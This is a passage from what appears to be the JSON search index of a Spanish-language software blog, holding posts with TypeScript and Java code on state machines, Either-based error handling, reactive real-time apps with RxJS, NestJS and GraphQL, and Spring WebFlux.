'factory-proccess' | 'visual-inspection' | 'functional-inspection' | 'approved' | 'rejected'const config: StateMachineConfig&lt;QualityControlState&gt; = { initialState: { name: 'factory-proccess', data: 'Building product' }, transitions: [ { from: 'factory-proccess', to: ['visual-inspection'] }, { from: 'visual-inspection', to: ['functional-inspection', 'rejected'] }, { from: 'functional-inspection', to: ['rejected', 'approved'] }, { from: 'rejected', to: ['factory-proccess'] }, ]}let productState = new StateMachine&lt;QualityControlState&gt;(config)/** * Execute transitions by 1 second interval. * @param states * @returns */const executeTransitions = (states: State&lt;QualityControlState&gt;[]) =&gt; { return interval(1000).pipe( take(states.length), map((index) =&gt; states[index]) )}const successTransitions = () =&gt; { const transitions: State&lt;QualityControlState&gt;[] = [ { name: 'visual-inspection', data: 'Performing visual inspection' }, { name: 'functional-inspection', data: 'Performing functional inspection' }, { name: 'approved', data: 'Product approved' }, ]; executeTransitions(transitions) .subscribe((state: State&lt;QualityControlState&gt;) =&gt; productState.transition(state));}const failedTransition = () =&gt; { const transitions: State&lt;QualityControlState&gt;[] = [ { name: 'visual-inspection', data: 'Performing visual inspection' }, { name: 'rejected', data: 'Product rejected' }, ]; executeTransitions(transitions) .subscribe((state: State&lt;QualityControlState&gt;) =&gt; productState.transition(state));}const invalidTransitions = () =&gt; { const transitions: State&lt;QualityControlState&gt;[] = [ { name: 'visual-inspection', data: 'Performing visual inspection' }, { name: 'approved', data: 'Product approved' }, ]; executeTransitions(transitions) .subscribe({ next: (state: State&lt;QualityControlState&gt;) =&gt; productState.transition(state), error: (err) =&gt; console.error(err.message) });}// Subscripcion al estado de un productoproductState .state() .subscribe(state =&gt; console.log('Product state', state))successTransitions()ConclusionesVimos un caso simple para visualizar los posibles estados de un producto. El uso del patrón de máquina de estados en la gestión de estados de software ofrece varias ventajas. Proporciona una forma clara de modelar el comportamiento del sistema y facilita la comprensión y el mantenimiento del código al encapsular la lógica en estados individuales. Además, permite la extensibilidad al agregar o modificar estados y transiciones. Sin embargo, es importante tener cuidado con la complejidad y asegurarse de cubrir todos los estados y transiciones de manera coherente para evitar comportamientos impredecibles o inconsistentes.En situaciones más complejas, es mejor utilizar alguna biblioteca o framework que permita manipular el estado de una aplicación para poder cubrir la coherencia, los eventos y la trazabilidad del proceso.Github repository🙂 Meme de cortesía:" }, { "title": "Robusto control de errores más allá del Try Catch", "url": "/posts/robust-error-handling-beyond-try-catch/", "categories": "Programacion, Arquitectura de software, Typescript", "tags": "Typescript, Javascript, Patterns Designs", "date": "2023-03-13 12:32:00 -0300", "snippet": "El control de errores en aplicaciones tradicionalmente los manejamos con trycatch si bien esto nos proporciona unamanera efectiva y simple de controlar errores y definir lógicas un poco más elaboradas de cara al cliente, existe otraalternativa proveniente de la programación funcional.Either MonadLa Either Monad es una estructura de datos en programación funcional que se utiliza para manejar valores que puedentener dos posibles estados: “éxito” o “falla”. Básicamente creamos una respuesta donde puede ser uno de estos 2 valores: Right value: lo que queremos retornar cuando nuestro código realiza una operación exitosa. Left value: retornamos un objeto que representa un error.Este simple enfoque nos puede proveer una manera de control de errores mucho más robusta.Try catch vs EitherDependiendo del escenario trycatch puede dejar de ser una manera efectiva de controlar errores, ya que una excepciónse refiere a algo excepcional que ha ocurrido en el sistema y este debe interrumpirse o tratar de recuperarse.Una excepción es adecuada para los siguientes casos: Problemas de red o conexión Errores en librerías de bajo nivel Errores correspondiente al ambiente o sistema operativoEn cambio Either es ideal para un control de errores más específicos relacionados con lógicas de dominio, ya que nos obligaa definir la respuesta correcta a ciertos errores, si bien la implementación de Either por si sola nos da la posibilidadentre una respuesta exitosa y una fallida, Este enfoque a menudo se implementa junto a pattern matching una estructura encontradamuy a menudo en la programación funcional. Esta combinación nos permite tener el control total de un flujo relacionado con la lógica principaldel programa, ya que estaremos obligados a implementar todas las posibles respuestas fallidas incluyendo el caso exitosoesto separa totalmente las excepciones de los errores de lógicas. En typescript no disponemos de pattern matching,pero podemos hacer algo interesante con el tipado.Implementando un control de errores avanzados con typescriptLa implementación básica de Either está dada por el siguiente código:export type Result&lt;T, E&gt; = Success&lt;T, E&gt; | Failure&lt;T, E&gt;;export class Success&lt;T, E&gt; { readonly success: T; constructor(success: T) { this.success = success; } isSuccess(): this is Success&lt;T, E&gt; { return true; } isError(): this is Failure&lt;T, E&gt; { return false; }}export class Failure&lt;T, E&gt; { readonly error: E; constructor(error: E) { this.error = error; } isSuccess(): this is Success&lt;T, E&gt; { return false; } isError(): this is Failure&lt;T, E&gt; { return true; }}El funcionamiento de estos componentes es el siguiente: Success: Representa una respuesta exitosa y contendrá un valor para ser tratado. Failure: Representa un error específico este también contiene un valor el cual puede ser el detalle del error ocurrido en la lógica Result: este objeto representa una respuesta exitosa o fallida,Si Result es exitoso puede devolver el valor de Success pero no puede devolver el error definido del objetoFailure, en cambio si Result es de tipo Failure podremos obtener el valor de Failure pero no el valor de Success.Para consultar si el objeto Result es exitoso lo haremos por medio del método isError() o isSuccessful() a su vez alinvocar alguno de estos 2 métodos typescript automáticamente hará un casting de Result a Success o Failuredependiendo de si la operación fue existosa o errónea// example 1result = failureOperation()result.error // typing error: error no existe mientras no se llame a isError()if(result.IsError()) { result.error // casting automatico}//example 2result = succesOperation()result.success // typing error: success no existe mientras no se llame a !isError()result.error // typing error: error no existe mientras no se llame a isError()if(!result.IsError()) { result.success // casting automatico}El uso de Either es bastante sencillo y poderoso ahora implementaremos un control de errores avanzado con esta clase de ayudaexport class ErrorHandler&lt;T extends string&gt; { constructor(private error: T, private message: string = 'No provided error message') {} match(handler: Record&lt;T, (message: string) =&gt; void&gt;) { if (handler.hasOwnProperty(this.error)) { handler[this.error](this.message); // si hay una coincidencia ejecutará el método callback } }}Esta clase recibe un tipo generico que representará los errores que pueden ocurrir, el método match se encarga de invocaruna función callback asociada al error. Para entender mejor este código crearemos nuestro ErrorHandler basados en una API de productos// definimos nuetsrso custom errorsexport type ProductErrors = 'unavailableStock' | 'serverError' | 'otherError'// heredamos una clase de ErrorHandler que representará nuestros erroresexport class ProductErrorHandler extends ErrorHandler&lt;ProductErrors&gt; {}El siguiente ejemplo nos permite entender el uso del patron Either, el método udpateStock() dependiendo del casodevolverá una respuesta exitosa o un error específico el cual puede tratarse de una manera más personalizada.export class ProductService { constructor( private productRepository: ProductRepository, private stockRepository: StockService ) {} updateStock(id: string, stock: number): Result&lt;any, UpdateStockErrorHandler&gt; { const product = this.productRepository.findById(new ProductID(id)) if (!product) { return new Failure(new UpdateStockErrorHandler('productNotFound', `Product(id=${id}) Not found`)) } const stockAvailable = this.stockRepository.queryStock(product.ID) if (stockAvailable &lt; 0) { return new Failure(new UpdateStockErrorHandler('unavailableStock', `Product(id=${id}) stock unavailable!!!`)) } if (stockAvailable &lt; 40) { return new Failure(new UpdateStockErrorHandler('insuffisientStock', `Product(id=${id}) stock cannot be updated`)) } this.stockRepository.updateStock(product.ID, stock) return new Success({ productId: product.ID, newStock: stock }) }}Y ahora cuando invocamos el servicio de productos Obtendremos nuestro objeto Result (patron Either)const productId = 'ab351bc97d'const result = productService.updateStock(productId, 20)if (result.isSuccess()) { result.success} else { result.error.match({ insuffisientStock:(msg: string) =&gt; { alertService.sendAlert(msg) }, productNotFound: (msg: string) =&gt; { // some actions... }, unavailableStock: (msg: string) =&gt; { // some actions... } })}Al invocar el método match() de Error nos obligará a implementar métodos callbacks basados en el type error definido previamente.// my custom errorsexport type ProductErrors = 'unavailableStock' | 'serverError' | 'otherError'ConclusionesImplementamos Either en typescript para un control de errores más robusto para la lógica principal de la aplicación.Either Puede ser interesante para abordar casos bordes de una manera sencilla con la posibilidad de cubrir de maneraobligatoria los errores referentes al negocio, mientras que trycatch nos puede tratar las excepciones como eventoso errores externos a la lógica de negocio principal.Meme de cortesía" }, { "title": "Aplicaciones en tiempo real con programación reactiva", "url": "/posts/realtime-with-reactive-programming/", "categories": "Programacion, Typescript, GraphQL, Arquitectura de software, Nestjs", "tags": "NestJs, Reactive, Typescript", "date": "2023-02-23 12:32:00 -0300", "snippet": "Las aplicaciones en tiempo real se definen como aquellas que ofrecen una respuesta en tiempo reala eventos del mundo real. Piensa en aplicaciones de chat en línea, aplicaciones de juegos,aplicaciones de seguimiento de eventos en vivo, y aplicaciones de trading en línea.En estas aplicaciones, la información debe ser entregada y procesada en tiempo real parabrindar una experiencia de usuario fluida y efectiva.Este tipo de aplicaciones pueden ser enfrentadas con programación reactiva que más allá de ser una técnica es un paradigmaque nos ofrece la posibilidad de crear aplicaciones complejas y altamente escalables.Aplicaciones en tiempo real con programación reactivaLa programación reactiva es una técnica que se utiliza para desarrollar aplicaciones en tiempo real y se basa en el usode flujos de datos asincrónicos y eventos. En lugar de ejecutar operaciones de forma secuencial, la programación reactivapermite que las operaciones se realicen en paralelo, lo que permite un procesamiento más rápido y una mejor escalabilidad.No profundizaré más allá de explicar las bases, pero en forma resumida la programación reactiva proporcionalas siguientes características: Responsivos: Tiempos de respuestas rápidos y consistentes. Resilientes: Capaces de responder adecuadamente cuando existen errores o problemas. Elásticos: Adaptación a cargas de trabajos variables Orientado a mensajes: Cada flujo o componente se comunica de manera asíncrona mediante mensajes y subscripciones a estos.La capacidad de trabajar con flujos de datos asíncronos nos proporciona una manera efectiva de crear aplicaciones en tiempo real,donde necesitamos priorizar el tratamiento de datos de manera eficiente. Una fuente ilimitada de datos trae los siguientes desafíos: Uso de memoria. Escucha de eventos específicos. Procesamiento de datos AsincronismoPara aterrizar esto utilizaremos la librería RxJs y trabajaremos sobre una aplicación que simulará el registro de unranking de puntos de multiples jugadores.Donde esta aplicación recibirá los puntajes de los jugadores conseguidos en una partida.Un ejemplo de petición es el siguiente:{ \"game\": \"ghost-of-kiev\", \"points\": 100, \"player\": \"red-panda\", \"playingTime\": 120, \"submittedAt\": \"2023-01-27\"}Entonces con base a esto nuestra aplicación hará lo siguiente: Registro de los puntajes Registro de los jugadores nuevos que transmitan puntos Registro de ranking de los mejores 10 jugadores Notificación en tiempo real de la actualización del ranking Notification en tiempo real del jugador que se corone como posición n.°1Arquitectura de una aplicación en tiempo realLa arquitectura interna de la aplicación es la siguiente:Cada operación que involucra código reactivo tiene su responsabilidad definida y puede emitir eventos donde otroscomponentes podrán escuchar y realizar tareas de forma independiente. Implementaremos una API con GraphQL y tendremosuna base de datos MongoDBVentajas de la programación ReactivaSi intentamos desarrollar nuestros casos de uso totalmente con programación imperativa, tendremos muchos desafíos en temas de rendimientoy lógicas complejas de mantener que no serán fácil de adaptar a nuevos requerimientos. Principalmente te daré la idea deque si hablamos de un sistema en tiempo real y queremos trabajar con los datos lo primero que haríamos es adaptar los datos a listasy empezar a desarrollar nuestros casos de uso, pero esa base nos proporciona complejidad en algoritmos y posible códigopropenso a convertirse en un plato de tallarines. En cambio si consideramos nuestros datos como un flujo podremos realizaroperaciones adecuadas ya las implementaciones del paradigma reactivo nos proporciona las siguientes herramientas: Poder de escuchar flujos de datos y realizar operaciones Encadenamiento de operaciones a los flujos Operaciones asíncronas Reutilización de flujos u operadoresImplementando una API con GraphQLUtilizaremos GraphQL para exponer nuestro modelo de datos y las operaciones que podremos realizar sobre este.GraphQL es un lenguaje de consulta y una tecnología de servidor que permite a los clientes solicitar y recibirsolo los datos que necesitan, en una sola solicitud, en lugar de múltiples solicitudes como ocurre en REST.Esto hace que la comunicación entre el cliente y el servidor sea más eficiente y flexible, lo que permite un desarrollode aplicaciones más rápido y escalable. GraphQL nos permite realizar las siguientes operaciones: Queries: Permiten solicitar datos al servidor. Podemos definir solo los datos que nos interesan. Mutations: Son operaciones que permiten modificar datos en el servidor. Subscriptions: Permiten establecer una conexión en tiempo real con el servidor, donde podemos recibir actualizaciones automáticas cada vez que ocurra un cambio en los datos que se han suscritoEstas operaciones y el modelo de datos se definen en un esquema de GraphQL. En este caso definiremoslas siguientes operaciones: Enviar puntaje asociado a un jugador Obtener Jugadores Subscribirse a Ranking top 10 Suscribirse a nuevo campeónY nuestro esquema GraphQL es el siguiente:type Response { message: String!}type Score { id: String! game: String! points: Int! player: String! playingTime: Int! submitedAt: Date!}type Player { name: String! points: Int!}type Ranking { place: Int! player: String! points: Int!}type Champion { player: String! points: Int! datetime: Date!}\"\"\"Date custom scalar type\"\"\"scalar Datetype Query { getScores: [Score!]! getPlayers: [Player!]!}type Mutation { createScore(score: ScoreInput!): Response!}input ScoreInput { game: String! points: Int! player: String! playingTime: Int! submitedAt: Date!}type Subscription { rankingUpdated: [Ranking!]! currentChampion: Champion!}Internamente debemos implementar como resolver las operaciones mediantes funciones llamadas resolvers,pero este no es el foco del artículo asi que con las bases de GraphQL explicadas vamos con los casos de uso sobreuna aplicación en tiempo realDesarrollo de los casos de usoLa implementación tecnológica la haremos sobre una aplicación Nestjs con MongoDB e implementaremos un servidor Graphql.Ciertas partes de la aplicación no se explicarán a detalle, ya que tenemos muchos componentes tanto en la parte deGraphQL y MongoDD. Nos centraremos en los casos de uso que implementan lógica reactiva.Registro de los puntajesEl caso de uso createScore lo implementa la clase ScoreService con el método save()el cual recibe un objeto DTOy realiza las operaciones con código reactivo.@Injectable()export class ScoreService { constructor( private readonly repository: ScoreMongoRepository, private readonly source: ScoreSubject ) { } save(dto: SaveScoreDto): Observable&lt;Score&gt; { return of(dto) // nuestro dto lo transformamos a un observable .pipe( // hacemos uso del operador pipe para poder encadenar operadores map(dto =&gt; Score.create(dto)), // transfromamos nuetsro Observable&lt;SaveScoreDto&gt; a Observable&lt;Score&gt; switchMap(score =&gt; this.repository.create(score)), // switchMap nos permite terminar neustra subscripcion de Observable&lt;Score&gt; y realizar una operacion de guardado en nuesttra base de datos tap(score =&gt; this.source.emit(score)), // tap se ejecutara cada vez que un valor sea emitido en este caso emitimos que un nuevo Score se ha creado ) } findAll(): Observable&lt;Score[]&gt; { return this.repository.stream().pipe( toArray(), ) } onSaved(): Observable&lt;Score&gt; { return this.source.onEmited() }}El objeto source nos permite notificar eventos a quienes se suscriban al método onSaved() el funcionamiento interno es el siguiente:import { Subject } from \"rxjs\";// clase baseexport abstract class SubjectBase&lt;T&gt; { private readonly subject: Subject&lt;T&gt; = new Subject() emit(value: T) { this.subject.next(value) } onEmited() { return this.subject.asObservable() }}Injectable()export class ScoreSubject extends SubjectBase&lt;Score&gt; {}Simplemente heredamos de SubjectBase y hacemos uso de sus métodos emit()para enviar un mensaje y onEmited() parapoder escuchar nuestros mensajes La clase Subject es propio de rxjs y su objetivo es poder emitir valores y obtenerlosexisten otras variantes que puedes consultar en su documentación para otros escenarios.Registro de los jugadores nuevos que transmitan puntosLa clase ScoreService registra los puntos y asu vez podemos utilizar su método onSaved() para realizar operaciones sobre estos eventosde la siguiente manera:@Injectable()export class SavePlayerService implements OnModuleInit { constructor( private readonly player: PlayerService, private readonly score: ScoreService, ) { } onModuleInit() { this.score.onSaved() // nos suscribimos a los eventos de Score Saved .pipe( switchMap(score =&gt; { // nos suscribimos a player.findByName() return this.player .findByName(score.player) // buscamos el jugador asociado al puntaje .pipe( defaultIfEmpty(Player.create({ name: score.player, points: 0 })), // si no existe creamos un jugador por defecto con 0 puntos tap(player =&gt; { // con tap por cada jugador realizamoa la operación de suma de puntos player.addPoints(score.points) }) ) }), switchMap(player =&gt; this.player.saveOrUpdate(player)), // del observable de Player nos cambiamos al de Guardar o actualizar jugador ) .subscribe({ next: player =&gt; Logger.log(`${player.toString()} Saved`), // log informativo error: err =&gt; Logger.error(err) //cualquier error lo notificamos }) }} SavePlayerService implementa OnModuleInit lo que nos permite ejecutar código cuando inicia el servidor.Registro de rankingEl registro del ranking es de una manera similar en este caso hacemos uso de PlayerService.onSaved() para obtenerla actualización de los jugadores y realizar los cálculos para el ranking de jugadores@Injectable()export class SaveRankingService implements OnModuleInit { ranking$: Observable&lt;Ranking[]&gt; constructor( private readonly player: PlayerService, private readonly ranking: RankingService ) { } onModuleInit() { Logger.log('save-rankings STARTED') this.ranking$ = this.player.onSaved() // suscripcion a los jugadroes .pipe( switchMap(() =&gt; this.calculateRanking()),// calculamos el ranking switchMap(rankings =&gt; this.ranking.save(rankings)) // guardamos el ranking ) this.ranking$.subscribe() // nos suscribimos para poder realizar los cálculos } calculateRanking() { const createRanking = (players: Player[]) =&gt; { return [...players] .sort((playerA: Player, playerB: Player) =&gt; playerB.points - playerA.points) .map((player, idx) =&gt; new Ranking({ place: idx + 1, player: player.name, points: player.points })) } return this.player.findAll() // obtenemos todos los jugadores .pipe( map(players =&gt; createRanking(players)) // creamos el ranking ) }}Ahora para crear las notificaciones en tiempo real haremos uso del siguiente componente creado para nuestro server GraphQL@Injectable()export class PubSubService { constructor(@Inject(GRAPHQL_PUB_SUB) private readonly pubsub: PubSub) {} publishRankingUpdated(rankings: Ranking[]) { this.pubsub.publish('rankingUpdated', rankings) } subscribeToRankingUpdated() { return this.pubsub.asyncIterator('rankingUpdated') } publishCurrentChampion(champion: Champion) { this.pubsub.publish('currentChampion', champion) } subscribeToCurrentChampion() { return this.pubsub.asyncIterator('currentChampion') }}Utilizamos la clase PubSub propia de la librería de Graphql y creamos los métodos de suscripción y los métodos denotificación de mensajes.Notificación de la actualización del rankingPara notificar el ranking en tiempo real implementamos el siguiente código:@Injectable()export class RankingUpdatedService implements OnModuleInit { constructor( private readonly ranking: RankingService, private readonly pubsub: PubSubService ) { } onModuleInit() { Logger.log('ranking-updated STARTED') this.ranking .onSaved() .subscribe(ranking =&gt; this.pubsub.publishRankingUpdated(ranking)) }}Solo nos suscribimos al RankingService.onSaved() y pubsub.publishRankingUpdated(ranking) hará el restoNotificación del jugador que se corone como posición n.°1Para saber quien se corona como número 1 del juego empleamos el siguiente código:@Injectable()export class ChampionUpdatedService implements OnModuleInit { constructor( private readonly ranking: RankingService, private readonly pubsub: PubSubService ) { } onModuleInit() { Logger.log('champion-updated STARTED') this.ranking.onSaved().pipe( mergeMap(rankings =&gt; rankings), // aplanamos el ranking es decir Observable&lt;Ranking[]&gt; -&gt; Observable&lt;Ranking&gt; filter(ranking =&gt; ranking.place === 1), // filtramos el número 1 distinctUntilKeyChanged('player'), // hacemos un distinct por la propiedad player y ademas se emitirá el valor cuando un nuevo jugador sea campeón map(ranking =&gt; ({ player: ranking.player, points: ranking.points, datetime: new Date() })), // mapeamos a un dto tap(champion =&gt; Logger.log('Current Champion ',champion)) // imprimimos el campeon ) .subscribe(champion =&gt; this.pubsub.publishCurrentChampion(champion)) // suscripcion y notificacion del campeón }}Ejecución de pruebasPara levantar la aplicación y realizar pruebas estos son los comandos:#!/bin/bash# run mongo dbexport database_name=\"ranking-db\"docker run --name \"$database_name\" -e MONGO_INITDB_DATABASE=\"$database_name\" -e MONGO_INITDB_ROOT_USERNAME=\"$database_name\" \\ -e MONGO_INITDB_ROOT_PASSWORD=\"$database_name\" -p 27017:27017 -d mongo# show mongodb containerdocker ps# run servernpm run start:dev# install requests librarypip3 install requests# run app clientpython3 score_client.pyAhora ve a http://localhost:3000/graphql y verás el Playground de GraphQL donde puedes realizar las consultas que te salga de los cojones:Puedes crear un score:Consultar los puntos:Consultar el ranking en tiempo real:Consultar el campeón de los jugadores:Puedes realizar pruebas y crear nuevos casos con programación reactiva este proyecto es una prueba de conceptocon la que puedes realizar diversas pruebas.Github repositoryConclusiónNos acercamos al mundo reactivo con un caso de usos de datos en realtime si bien este caso es básico y en el mundo realla solución también implicaría componentes de infraestructura podemos entender de mejor manera este paradigma en el lado del backend.Finalmente el meme de cortesía" }, { "title": "Aplicaciones Reactivas de Alto Rendimiento con Spring WebFlux", "url": "/posts/high-performance-reactive-applications-with-spring-webflux/", "categories": "Programacion, Java, Arquitectura de software, Spring, Springboot, Reactive", "tags": "Java, Spring, Reactive, Reactor", "date": "2023-02-10 12:32:00 -0300", "snippet": "¿Qué es Spring WebFluxSpring WebFlux es un proyecto del Framework Spring que permite el desarrollo de aplicaciones web asíncronas siguiendo el paradigma de programación reactivo. Ofrece una alternativa al modelo síncrono de Spring Web MVC donde cada solicitud es atendida por un hilo separado.La principal característica de WebFlux es su enfoque asíncrono y no bloqueante basado en la gestión de hilos similar al Event Loop de NodeJs, lo que permite procesar solicitudes de manera eficiente y escalable, especialmente en aplicaciones web con un alto tráfico de datos.Entendiendo FLux y MonoPara crear aplicaciones reactivas debemos conocer a Flux y Mono que son objetos en el marco de trabajo Reactor que representan flujos de datos y eventos asíncronos. Flux: representa flujos con múltiples valores Mono: representa flujos con un solo valor.Tanto Flux y Mono Ofrecen operadores para manipular y transformar los flujos de datos en aplicaciones reactivas.A su vez nos ofrece una manera simple de crear flujos a partir de otros objetos.SubscripcionesPara utilizar nuestros flujos reactivos debemos subscribirnos a estos ya que los objetos Flux son lazy. También nos da la posibilidad que puedan existir múltiples subscriptores a un flujo.var flux = Flux.fromIterable(Arrays.asList(10,20,30,40,50)); // creating a Integer fluxflux.subscribe(System.out::println); // subscribe to get valuesEntendiendo las bases implementaremos una API simple de ejemplo basados en el paradigma reactivo utilizado por WebFLux.¿Qué es la programación reactiva?Es un paradigma de programación que se centra en la gestión de flujos de datos y eventos asíncronos.Se basa en la idea de que las aplicaciones deben responder de forma eficiente a los cambios en los flujos de datosy eventos, incluso cuando estos cambios son frecuentes y volátiles.Este paradigma se describe en el Manifiesto Reactivo esto quiere decir que los sistemas reactivos son: Responsivos: tiempos de respuesta rápidos y consistentes. Resilientes: permite que el sistema siga funcionando incluso en caso de fallos. Elasticicos: permite al sistema adaptarse a cambios durante las cargas de trabajo. Orientados a mensajes: cuando un valor es emitido todo aquel componente que se halla suscrito obtendrá ese valor.El intercambio asíncrono de mensajes nos permite establecer fronteras entre componentes y mejorar la gestión de la carga, la elasticidad y el control de flujo.Implementación de API reactivaImplementaremos nuestra aplicación reactiva basada en el artículo acerca de Java Stream básicamente trabajaremos sobre una tabla producto. Organizaremos nuestro repositorio como monorepositorio transformamos nuestro ejemplo de Stream de java en una librería llamada products y creamos las siguientes aplicaciones: api-webflux: API Server que implementará spring-webflux. api-blocking: API Server bloqueante que usaremos para comparar el rendimiento contra una aplicación reactiva. client-reactive: Cliente http que consumirá nuestra API Reactiva.Declaramos la dependecia necesaria en gradle.build:# gradle.build# ... other configsdependencies { implementation 'org.springframework.boot:spring-boot-starter-webflux' implementation project(\":libs:products\")}Nuestra aplicación api-webflux solo contendrá una clase Main que inicia una aplicación Spring hacemos uso de nuestra librería products importada en el archivo de configuración gradle.build@Log4j2@RestController @RequestMapping(\"product\")@SpringBootApplication@Import(ProductConfiguration.class) // import spring configuration from products libpublic class WebFluxApplication { @Autowired private ProductService products; public static void main(String[] args) { SpringApplication.run(WebFluxApplication.class, args); } @GetMapping public Flux&lt;Product&gt; getAllProducts() { log.info(\"All products request\"); return Flux.fromStream(products.getAllProducts()); }}Para crear nuestro endpoint reactivo solo debemos devolver un objeto Flux y spring por debajo hará su magia. Como nuestro caso de uso retorna un objeto Stream hacemos uso del método fromStream() de la clase Flux.Con esto nuestra api reactiva esta lista.Implementación de cliente reactivoEn nuestro proyecto cliente client-reactive haremos uso de WebClient (librería incorporada dentro de WebFlux) con el cual podremos obtener los datos en forma asíncrona. WebClient nos permite trabajar con flujos asíncronos proporcionando todas las bondades de la librería Reactor, A diferencia del clásico cliente de Spring RestTemplate el cual es bloqueante.El siguiente código muestra como utilizar WebClient de forma básica. Podremos crear nuestro cliente dependiendo de nuestras necesidades.WebClient client = WebClient.create(\"http://localhost:8080\");Flux&lt;Product&gt; products = client.get() .uri(\"/product\") .retrieve() .bodyToFlux(Product.class);products.subscribe(System.out::println);Ahora Definimos nuestro WebClient como un bean de Spring disponible en toda la aplicación y lo inyectamos en nuestro componente ProductAPI// App Configuration@Configuration@SpringBootApplicationpublic class AppClientReactive { // ..more code @Bean public WebClient getWebClient() { return WebClient.create(\"http://localhost:8080\"); }}// Product API Component@Componentpublic class ProductAPI { @Autowired private WebClient client; public Flux&lt;Product&gt; getProducts() { return client.get() .uri(\"/product\") .retrieve() .bodyToFlux(Product.class); }}Finalmente creamos nuestro ProductService que contendrá nuestros casos de uso utilizando las funciones que nos ofrece el paradigma reactivo.@Servicepublic class ProductService { @Autowired private ProductAPI api; public Flux&lt;String&gt; getBrands() { return api.getProducts() .map(Product::getBrand) .distinct(); } public Flux&lt;Product&gt; getAllProducts() { return api.getProducts(); } public Flux&lt;Product&gt; getProductWithoutStock() { return api.getProducts() .filter(product -&gt; product.getStock() &lt;= 0); } public Mono&lt;Long&gt; countSkuWithoutStock() { return api.getProducts() .filter(product -&gt; product.getStock() &lt;= 0) .count(); } public Mono&lt;Integer&gt; sumStockDepartment604() { return api.getProducts() .filter(product -&gt; product.getDepartment().equals(\"604\")) .map(Product::getStock) .reduce(0, Integer::sum); } public Flux&lt;Brand&gt; groupByDepartment604Brand() { Function&lt;Map&lt;String, Collection&lt;Product&gt;&gt;, Stream&lt;Brand&gt;&gt; mapToBrand = (Map&lt;String, Collection&lt;Product&gt;&gt; map) -&gt; map .entrySet() .stream() .map(Brand::fromEntrySet); return api.getProducts() .filter(product -&gt; product.getDepartment().equals(\"604\")) .groupBy(p -&gt; p.getBrand() != null ? p.getBrand() : \"No brand\") .flatMap(group -&gt; group.collectMultimap(Product::getBrand, item -&gt; item)) .map(mapToBrand) .flatMap(Flux::fromStream); } public Mono&lt;Long&gt; getCount() { return api.getProducts().count(); }}Las operaciones realizadas son muy similares a lo que lograríamos con Java Stream, pero esta se basa en un modelo de “pull”, en el que los datos se consumen poco a poco, a medida que se los va solicitando.En cambio ReactiveStream (En Reactor Flux) es un modelo “push-pull”, que permite que los datos se produzcany se consuman de forma asíncrona. Se puede considerar a Flux como una mezcla de Stream + CompletableFuture con las siguientes características: muchos operadores aplicables a los flujos de datos. soporte de BackPressure (velocidad de producción VS la velocidad de consumo de flujos). control sobre el comportamiento del publicador y suscriptor. control sobre la noción de tiempo (ventanas de almacenamiento de valores, agregar tiempos de espera y alternativas, etc.)Ya entendiendo las diferencias podemos aplicar operaciones más complejas a nuestro flujo reactivo como pueden ser:múltiple subscripciones:var products = productService .getProductWithoutStock() .share(); // Nos permite compartir una subscripcion a un unico flujo products.subscribe(System.out::println);products.subscribe(p -&gt; stockService.updateStock(p));products.subscribe(p -&gt; emailService.notify(p));Operaciones sobre el tiempovar products = productService .getProductWithoutStock() .delayElements(Duration.ofMillis(100));products.subscribe(System.out::println);Reintentos dependiendo de las condiciones que queramos contemplar:var products = productService .getProductWithoutStock() .retryWhen(Retry.fixedDelay(3L, Duration.ofSeconds(10))); // Retry nos permitira construir la estrategia de retry mas adecuada a nuestro contextoproducts.subscribe(System.out::println);También podemos realizar otras operaciones más complejas que necesitan ser explicadas más en profundidad, tales como: Control sobre quien va a ejecutar las tareas permitiéndonos el control de los hilos de manera pragmática crear subscripciones internas sobre cada elemento de un flujo. terminar una subscripción y unirse a otra. manejar múltiples flujos dentro de un mismo flujo.WebFlux utiliza el proyecto Reactor para poder trabajar con el paradigma reactivo. su documentación es bien completa a nivel conceptual y en el uso de su API, pero el punto de partida ideal sería probar Spring WebFlux el cual nos permitirá crear aplicaciones reactivas de manera sencilla. Este tipo de enfoque de desarrollo es ideal para microservicios.Comparando WebMvc vs WebFluxCompararemos una API desarrollada con Spring WebMvc bloqueante y otra diseñada con WebFLux no bloqueante. Definimos nuestra dependecia en la aplicación api-blocking:# gradle.build# ... other configsdependencies { implementation 'org.springframework.boot:spring-boot-starter-web' implementation project(\":libs:products\")}Y montamos un clásico web server con spring@Log4j2@RestController@RequestMapping(\"product\")@SpringBootApplication@Import(ProductConfiguration.class)public class WebApplication { @Autowired private ProductRepository repository; public static void main(String[] args) { SpringApplication.run(WebApplication.class, args); } @GetMapping public Stream&lt;Product&gt; getProducts( @RequestParam(value= \"limit\", defaultValue=\"100\") Integer limit, @RequestParam(value=\"offset\", defaultValue=\"0\") Integer offset ) { log.info(\"Web-app Request limit: {}, offset: {}\", limit, offset); return repository.findByPaginated(limit, offset).stream(); }}Y Ahora podemos hacer el siguiente ejercicio con curl para ver la diferencia entre una api bloqueante y asíncrona.Petición bloqueanteNuestra petición bloqueante esperará a terminar la operación de la API y nos devolverá los datos.Petición no bloqueanteNuestra petición a la API reactiva va obteniendo los datos en forma parcial, no necesitamos que el servidor termine de realizar las operacionespara poder trabajar, nuestro cliente no se quedara bloqueado esperando una respuesta ya los datos vienen en un flujo de manera asíncrona.En este caso, la respuesta de nuestra API nos permite trabajar de forma reactiva.Resumiendo las diferencias entre una API síncrona como Spring Web y el enfoque asíncrono que nos brinda WebFlux serían: Spring Web utiliza un modelo de programación síncrono y basado en hilos, donde un hilo se bloquea hasta que se recibe una respuesta del servidor. Este modelo es efectivo para muchos casos, pero puede ser limitante en términos de escalabilidad y rendimiento en entornos de alto tráfico. Spring WebFlux utiliza un modelo de programación asíncrono y no bloqueante basado en un modelo concurrente EventLoop, donde el servidor puede manejar muchas solicitudes simultáneamente sin bloquear los hilos. Este modelo es más escalable y eficiente en entornos de alto tráfico y ofrece mejores tiempos de respuesta y una mejor gestión de recursos. ConclusionesEste es la primera mirada que le damos a Spring WebFlux y El modelo Reactivo la verdad este paradigma da para muchos ejemplos prácticos y casos de uso. Este enfoque es ideal para crear microservicios resilientes y escalables cuando necesitamos una comunicación síncrona podemos facilmente pasar a un modelo asíncrono con las ventajas que nos da la programación reactiva. Si estás desarrollando una aplicación web de tamaño medio con una cantidad moderada de tráfico, Spring Web probablemente sea suficiente. Pero si estás desarrollando una aplicación web de alta escalabilidad con una gran cantidad de tráfico, Spring WebFlux es la opción más adecuada debido a su enfoque reactivo y no bloqueante.Github repositoryMeme de cortesía" }, { "title": "Trabajando con 1 millón de registros con Java Stream", "url": "/posts/tranajando-con-1millon-de-registros-con-java-stream/", "categories": "Programacion, Java, Arquitectura de software, Spring, Springboot", "tags": "Java, Spring, Stream", "date": 